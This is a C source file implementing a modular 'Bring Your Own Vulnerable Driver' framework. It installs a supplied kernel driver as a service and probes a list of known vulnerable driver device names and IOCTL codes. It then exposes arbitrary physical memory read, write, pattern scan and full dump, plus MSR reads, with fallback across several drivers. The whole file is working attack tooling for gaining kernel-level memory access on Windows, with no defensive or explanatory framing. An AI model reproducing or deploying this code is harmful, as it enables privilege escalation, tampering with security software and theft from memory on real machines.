/*
 * BYOVD Runtime Implementation
 * Modular Bring Your Own Vulnerable Driver framework.
 *
 * Part of JOCKY - SIH-148
 */

#include "byovd_modular.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Common vulnerable driver IOCTL patterns */
typedef struct _IOCTL_PROBE {
    DWORD   Code;
    DWORD   InSize;
    DWORD   OutSize;
    const char* Name;
} IOCTL_PROBE;

static IOCTL_PROBE g_IoctlProbes[] = {
    {0x9C402580, sizeof(ULONGLONG)*3, sizeof(ULONGLONG)*3, "map_phys"},
    {0x9C402584, sizeof(ULONGLONG)*3, 0, "unmap_phys"},
    {0x9C402588, sizeof(ULONGLONG)*2, sizeof(ULONGLONG)*2, "read_msr"},
    {0x9C40258C, sizeof(ULONGLONG)*2, 0, "write_msr"},
    {0x222000,   0x18, 0x18, "map_phys_22"},
    {0x222004,   0x18, 0,    "unmap_phys_22"},
    {0x222008,   0x10, 0x10, "read_msr_22"},
    {0x22200C,   0x10, 0,    "write_msr_22"},
    {0x80102040, 0x18, 0x18, "map_phys_80"},
    {0x80102044, 0x18, 0,    "unmap_phys_80"},
    {0x80802000, 0x18, 0x18, "map_phys_80int"},
    {0x80802004, 0x18, 0,    "unmap_phys_80int"},
    {0x81000000, 0x18, 0x18, "map_phys_amd"},
    {0x81000004, 0x18, 0,    "unmap_phys_amd"},
    {0x82000000, 0x18, 0x18, "map_phys_rtk"},
    {0x82000004, 0x18, 0,    "unmap_phys_rtk"},
    {0x83002000, 0x18, 0x18, "map_phys_gb"},
    {0x83002004, 0x18, 0,    "unmap_phys_gb"},
    {0x80002000, 0x18, 0x18, "map_phys_fb1"},
    {0x80002004, 0x18, 0,    "unmap_phys_fb1"},
    {0x80002008, 0x10, 0x10, "read_msr_fb1"},
    {0x8000200C, 0x10, 0,    "write_msr_fb1"},
    {0x83350000, 0x18, 0x18, "map_phys_ph"},
    {0x83350004, 0x18, 0,    "unmap_phys_ph"},
    {0x84002000, 0x18, 0x18, "map_phys_ms"},
    {0x84002004, 0x18, 0,    "unmap_phys_ms"},
    {0x85000000, 0x18, 0x18, "map_phys_c2"},
    {0x85000004, 0x18, 0,    "unmap_phys_c2"},
    {0x86000000, 0x18, 0x18, "map_phys_gdrv"},
    {0x86000004, 0x18, 0,    "unmap_phys_gdrv"},
    {0x88000000, 0x18, 0x18, "map_phys_fb2"},
    {0x88000004, 0x18, 0,    "unmap_phys_fb2"},
    {0x88000008, 0x10, 0x10, "read_msr_fb2"},
    {0x8800000C, 0x10, 0,    "write_msr_fb2"},
    {0x90000000, 0x18, 0x18, "map_phys_fb3"},
    {0x90000004, 0x18, 0,    "unmap_phys_fb3"},
    {0x90000008, 0x10, 0x10, "read_msr_fb3"},
    {0x9000000C, 0x10, 0,    "write_msr_fb3"},
    {0x9C40A000, 0x18, 0x18, "map_phys_rwe"},
    {0x9C40A004, 0x18, 0,    "unmap_phys_rwe"},
};

typedef struct _PHYS_MAP_REQUEST {
    ULONGLONG PhysicalAddress;
    ULONG     Size;
    ULONGLONG VirtualAddress;
} PHYS_MAP_REQUEST;

typedef struct _MSR_REQUEST {
    ULONG     Index;
    ULONGLONG Value;
} MSR_REQUEST;

struct ByovdContext {
    HANDLE    hDevice;
    DWORD     MapPhysIoctl;
    DWORD     UnmapPhysIoctl;
    DWORD     ReadMsrIoctl;
    BOOL      HasMapPhys;
    BOOL      HasMsr;
    wchar_t   DeviceName[256];
    wchar_t   ServiceName[64];
    SC_HANDLE hScm;
    SC_HANDLE hSvc;
};

static wchar_t* ExtractDriverName(const wchar_t* path)
{
    const wchar_t* lastSlash = wcsrchr(path, L'\\');
    const wchar_t* lastBack = wcsrchr(path, L'/');
    const wchar_t* name = path;
    if (lastSlash && lastSlash > name) name = lastSlash + 1;
    if (lastBack && lastBack > name) name = lastBack + 1;

    static wchar_t svc[64];
    wcsncpy(svc, name, 63);
    svc[63] = 0;
    wchar_t* dot = wcsrchr(svc, L'.');
    if (dot) *dot = 0;
    return svc;
}

static BOOL TryOpenDevice(struct ByovdContext* ctx, const wchar_t* devName)
{
    if (ctx->hDevice && ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
    }

    ctx->hDevice = CreateFileW(
        devName, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        wcsncpy(ctx->DeviceName, devName, 255);
        ctx->DeviceName[255] = 0;
        return TRUE;
    }
    return FALSE;
}

static BOOL ByovdFindDevice(struct ByovdContext* ctx)
{
    wchar_t devNames[40][128];
    int count = 0;

    swprintf(devNames[count++], 127, L"\\\\.\\%ls", ctx->ServiceName);
    swprintf(devNames[count++], 127, L"\\\\.\\%ls141", ctx->ServiceName);
    swprintf(devNames[count++], 127, L"\\\\.\\%ls64", ctx->ServiceName);
    swprintf(devNames[count++], 127, L"\\\\.\\%lsx64", ctx->ServiceName);
    wcscpy(devNames[count++], L"\\\\.\\RTCore64");
    wcscpy(devNames[count++], L"\\\\.\\WinIo");
    wcscpy(devNames[count++], L"\\\\.\\WinRing0");
    wcscpy(devNames[count++], L"\\\\.\\WinRing0_1_2_0");
    wcscpy(devNames[count++], L"\\\\.\\NCHGBIOS2x64");
    wcscpy(devNames[count++], L"\\\\.\\PhyMem");
    wcscpy(devNames[count++], L"\\\\.\\driver");
    wcscpy(devNames[count++], L"\\\\.\\AsrDrv101");
    wcscpy(devNames[count++], L"\\\\.\\AsrDrv102");
    wcscpy(devNames[count++], L"\\\\.\\AsrDrv103");
    wcscpy(devNames[count++], L"\\\\.\\AsrDrv106");
    wcscpy(devNames[count++], L"\\\\.\\gdrv");
    wcscpy(devNames[count++], L"\\\\.\\GIO");
    wcscpy(devNames[count++], L"\\\\.\\NTIOLib");
    wcscpy(devNames[count++], L"\\\\.\\NTIOLib_1_2_4");
    wcscpy(devNames[count++], L"\\\\.\\Nal");
    wcscpy(devNames[count++], L"\\\\.\\zamguard64");
    wcscpy(devNames[count++], L"\\\\.\\GLCKIo");
    wcscpy(devNames[count++], L"\\\\.\\IoctlTest");
    wcscpy(devNames[count++], L"\\\\.\\EneIo");
    wcscpy(devNames[count++], L"\\\\.\\Global\\");

    for (int i = 0; i < count; i++) {
        if (TryOpenDevice(ctx, devNames[i])) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL ProbeMapPhys(struct ByovdContext* ctx, DWORD ioctl, DWORD inSize, DWORD outSize)
{
    PHYS_MAP_REQUEST req = {0};
    req.PhysicalAddress = 0x1000;
    req.Size = 4096;

    DWORD br = 0;
    BOOL ok = DeviceIoControl(
        ctx->hDevice, ioctl,
        &req, inSize,
        &req, outSize,
        &br, NULL
    );

    if (ok && req.VirtualAddress != 0) {
        PHYS_MAP_REQUEST unmap = {0};
        unmap.VirtualAddress = req.VirtualAddress;
        DeviceIoControl(ctx->hDevice, ioctl + 4, &unmap, inSize, NULL, 0, &br, NULL);
        return TRUE;
    }

    BYTE buf[0x40] = {0};
    *(ULONGLONG*)(buf + 0) = 0x1000;
    *(ULONG*)(buf + 8) = 4096;
    ok = DeviceIoControl(ctx->hDevice, ioctl, buf, 0x18, buf, 0x18, &br, NULL);
    if (ok && *(ULONGLONG*)(buf + 0x10) != 0) {
        return TRUE;
    }
    return FALSE;
}

static BOOL ProbeMsr(struct ByovdContext* ctx, DWORD ioctl, DWORD inSize, DWORD outSize)
{
    MSR_REQUEST req = {0};
    req.Index = 0x1B;

    DWORD br = 0;
    BOOL ok = DeviceIoControl(
        ctx->hDevice, ioctl,
        &req, inSize,
        &req, outSize,
        &br, NULL
    );
    if (ok) return TRUE;

    BYTE buf[0x20] = {0};
    *(ULONG*)(buf + 0) = 0x1B;
    ok = DeviceIoControl(ctx->hDevice, ioctl, buf, 0x10, buf, 0x10, &br, NULL);
    return ok;
}

static BOOL DiscoverInterface(struct ByovdContext* ctx)
{
    int numProbes = sizeof(g_IoctlProbes) / sizeof(g_IoctlProbes[0]);

    for (int i = 0; i < numProbes; i++) {
        IOCTL_PROBE* p = &g_IoctlProbes[i];
        if (strncmp(p->Name, "map_phys", 8) != 0) continue;
        if (ProbeMapPhys(ctx, p->Code, p->InSize, p->OutSize)) {
            ctx->MapPhysIoctl = p->Code;
            ctx->HasMapPhys = TRUE;
            ctx->UnmapPhysIoctl = p->Code + 4;
            break;
        }
    }

    if (!ctx->HasMapPhys) return FALSE;

    for (int i = 0; i < numProbes; i++) {
        IOCTL_PROBE* p = &g_IoctlProbes[i];
        if (strncmp(p->Name, "read_msr", 8) != 0) continue;
        if (ProbeMsr(ctx, p->Code, p->InSize, p->OutSize)) {
            ctx->ReadMsrIoctl = p->Code;
            ctx->HasMsr = TRUE;
            break;
        }
    }

    return TRUE;
}

HBYOVD byovd_init(const wchar_t* driverPath)
{
    struct ByovdContext* ctx = (struct ByovdContext*)calloc(1, sizeof(struct ByovdContext));
    if (!ctx) return NULL;

    wchar_t* svcName = ExtractDriverName(driverPath);
    wcsncpy(ctx->ServiceName, svcName, 63);
    ctx->ServiceName[63] = 0;

    ctx->hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!ctx->hScm) {
        free(ctx);
        return NULL;
    }

    ctx->hSvc = OpenServiceW(ctx->hScm, ctx->ServiceName, SERVICE_ALL_ACCESS);
    if (ctx->hSvc) {
        SERVICE_STATUS status;
        ControlService(ctx->hSvc, SERVICE_CONTROL_STOP, &status);
        DeleteService(ctx->hSvc);
        CloseServiceHandle(ctx->hSvc);
        Sleep(500);
    }

    ctx->hSvc = CreateServiceW(
        ctx->hScm, ctx->ServiceName, ctx->ServiceName,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        driverPath, NULL, NULL, NULL, NULL, NULL
    );

    if (!ctx->hSvc) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            ctx->hSvc = OpenServiceW(ctx->hScm, ctx->ServiceName, SERVICE_ALL_ACCESS);
        }
        if (!ctx->hSvc) {
            CloseServiceHandle(ctx->hScm);
            free(ctx);
            return NULL;
        }
    }

    if (!StartServiceW(ctx->hSvc, 0, NULL)) {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(ctx->hSvc);
            CloseServiceHandle(ctx->hScm);
            free(ctx);
            return NULL;
        }
    }

    if (!ByovdFindDevice(ctx)) {
        SERVICE_STATUS status;
        ControlService(ctx->hSvc, SERVICE_CONTROL_STOP, &status);
        DeleteService(ctx->hSvc);
        CloseServiceHandle(ctx->hSvc);
        CloseServiceHandle(ctx->hScm);
        free(ctx);
        return NULL;
    }

    if (!DiscoverInterface(ctx)) {
        CloseHandle(ctx->hDevice);
        SERVICE_STATUS status;
        ControlService(ctx->hSvc, SERVICE_CONTROL_STOP, &status);
        DeleteService(ctx->hSvc);
        CloseServiceHandle(ctx->hSvc);
        CloseServiceHandle(ctx->hScm);
        free(ctx);
        return NULL;
    }

    return ctx;
}

void byovd_shutdown(HBYOVD handle)
{
    struct ByovdContext* ctx = (struct ByovdContext*)handle;
    if (!ctx) return;

    if (ctx->hDevice && ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
    }
    if (ctx->hSvc) {
        SERVICE_STATUS status;
        ControlService(ctx->hSvc, SERVICE_CONTROL_STOP, &status);
        DeleteService(ctx->hSvc);
        CloseServiceHandle(ctx->hSvc);
    }
    if (ctx->hScm) {
        CloseServiceHandle(ctx->hScm);
    }
    free(ctx);
}

bool byovd_map_physical(HBYOVD handle, ULONG_PTR physAddr, ULONG size, void** virtualAddr)
{
    struct ByovdContext* ctx = (struct ByovdContext*)handle;
    if (!ctx || !ctx->HasMapPhys) return false;

    PHYS_MAP_REQUEST req = {0};
    req.PhysicalAddress = physAddr;
    req.Size = size;

    DWORD br = 0;
    BOOL ok = DeviceIoControl(
        ctx->hDevice, ctx->MapPhysIoctl,
        &req, sizeof(req),
        &req, sizeof(req),
        &br, NULL
    );

    if (ok && req.VirtualAddress != 0) {
        *virtualAddr = (void*)(ULONG_PTR)req.VirtualAddress;
        return true;
    }

    BYTE buf[0x40] = {0};
    *(ULONGLONG*)(buf + 0) = physAddr;
    *(ULONG*)(buf + 8) = size;
    ok = DeviceIoControl(ctx->hDevice, ctx->MapPhysIoctl, buf, 0x18, buf, 0x18, &br, NULL);
    if (ok && *(ULONGLONG*)(buf + 0x10) != 0) {
        *virtualAddr = (void*)(ULONG_PTR)(*(ULONGLONG*)(buf + 0x10));
        return true;
    }

    return false;
}

bool byovd_unmap_physical(HBYOVD handle, void* virtualAddr)
{
    struct ByovdContext* ctx = (struct ByovdContext*)handle;
    if (!ctx || !ctx->HasMapPhys) return false;

    PHYS_MAP_REQUEST req = {0};
    req.VirtualAddress = (ULONGLONG)(ULONG_PTR)virtualAddr;

    DWORD br = 0;
    return DeviceIoControl(
        ctx->hDevice, ctx->UnmapPhysIoctl,
        &req, sizeof(req),
        NULL, 0, &br, NULL
    );
}

bool byovd_read_phys(HBYOVD handle, ULONG_PTR physAddr, void* buffer, ULONG size)
{
    void* mapped = NULL;
    if (!byovd_map_physical(handle, physAddr, size, &mapped)) return false;
    memcpy(buffer, mapped, size);
    byovd_unmap_physical(handle, mapped);
    return true;
}

bool byovd_write_phys(HBYOVD handle, ULONG_PTR physAddr, const void* buffer, ULONG size)
{
    void* mapped = NULL;
    if (!byovd_map_physical(handle, physAddr, size, &mapped)) return false;
    memcpy(mapped, buffer, size);
    byovd_unmap_physical(handle, mapped);
    return true;
}

bool byovd_read_msr(HBYOVD handle, ULONG msrIndex, unsigned long long* value)
{
    struct ByovdContext* ctx = (struct ByovdContext*)handle;
    if (!ctx || !ctx->HasMsr) return false;

    MSR_REQUEST req = {0};
    req.Index = msrIndex;

    DWORD br = 0;
    BOOL ok = DeviceIoControl(
        ctx->hDevice, ctx->ReadMsrIoctl,
        &req, sizeof(req),
        &req, sizeof(req),
        &br, NULL
    );

    if (ok) {
        *value = req.Value;
        return true;
    }

    BYTE buf[0x20] = {0};
    *(ULONG*)(buf + 0) = msrIndex;
    ok = DeviceIoControl(ctx->hDevice, ctx->ReadMsrIoctl, buf, 0x10, buf, 0x10, &br, NULL);
    if (ok) {
        *value = *(ULONGLONG*)(buf + 8);
        return true;
    }

    return false;
}

bool byovd_scan_phys(HBYOVD handle, ULONG_PTR start, ULONG_PTR end,
                     const unsigned char* pattern, ULONG patternLen,
                     ULONG_PTR* foundAddr)
{
    const ULONG chunkSize = 0x10000;
    unsigned char* chunk = (unsigned char*)malloc(chunkSize);
    if (!chunk) return false;

    for (ULONG_PTR addr = start; addr < end; addr += chunkSize) {
        if (byovd_read_phys(handle, addr, chunk, chunkSize)) {
            for (ULONG i = 0; i <= chunkSize - patternLen; i++) {
                if (memcmp(chunk + i, pattern, patternLen) == 0) {
                    *foundAddr = addr + i;
                    free(chunk);
                    return true;
                }
            }
        }
    }

    free(chunk);
    return false;
}

bool byovd_dump_phys(HBYOVD handle, ULONG_PTR start, ULONG_PTR end, const char* outPath)
{
    FILE* f = fopen(outPath, "wb");
    if (!f) return false;

    const ULONG chunk = 0x10000;
    unsigned char* buf = (unsigned char*)malloc(chunk);
    if (!buf) {
        fclose(f);
        return false;
    }

    for (ULONG_PTR addr = start; addr < end; addr += chunk) {
        if (byovd_read_phys(handle, addr, buf, chunk)) {
            fwrite(buf, 1, chunk, f);
        } else {
            memset(buf, 0, chunk);
            fwrite(buf, 1, chunk, f);
        }
    }

    free(buf);
    fclose(f);
    return true;
}

bool byovd_is_active(HBYOVD handle)
{
    struct ByovdContext* ctx = (struct ByovdContext*)handle;
    return ctx && ctx->HasMapPhys && ctx->hDevice != INVALID_HANDLE_VALUE;
}

HBYOVD byovd_init_with_fallback(const wchar_t* const* driverPaths, int pathCount)
{
    if (!driverPaths || pathCount <= 0) return NULL;

    for (int i = 0; i < pathCount; i++) {
        HBYOVD handle = byovd_init(driverPaths[i]);
        if (handle && byovd_is_active(handle)) {
            return handle;
        }
        if (handle) {
            byovd_shutdown(handle);
        }
    }

    return NULL;
}

typedef struct {
    HBYOVD handle;
    int preferred_driver_index;
} ByovdFallbackContext;

HBYOVD byovd_init_smart_fallback(const wchar_t* const* driverPaths, int pathCount, const int* priorityScores)
{
    if (!driverPaths || pathCount <= 0) return NULL;

    typedef struct {
        int index;
        int score;
    } DriverEntry;

    DriverEntry* entries = (DriverEntry*)malloc(pathCount * sizeof(DriverEntry));
    if (!entries) return NULL;

    for (int i = 0; i < pathCount; i++) {
        entries[i].index = i;
        entries[i].score = priorityScores ? priorityScores[i] : (100 - i * 10);
    }

    for (int i = 0; i < pathCount - 1; i++) {
        for (int j = i + 1; j < pathCount; j++) {
            if (entries[j].score > entries[i].score) {
                DriverEntry tmp = entries[i];
                entries[i] = entries[j];
                entries[j] = tmp;
            }
        }
    }

    HBYOVD result = NULL;
    for (int i = 0; i < pathCount; i++) {
        int idx = entries[i].index;
        HBYOVD handle = byovd_init(driverPaths[idx]);
        if (handle && byovd_is_active(handle)) {
            result = handle;
            free(entries);
            return result;
        }
        if (handle) {
            byovd_shutdown(handle);
        }
    }

    free(entries);
    return NULL;
}
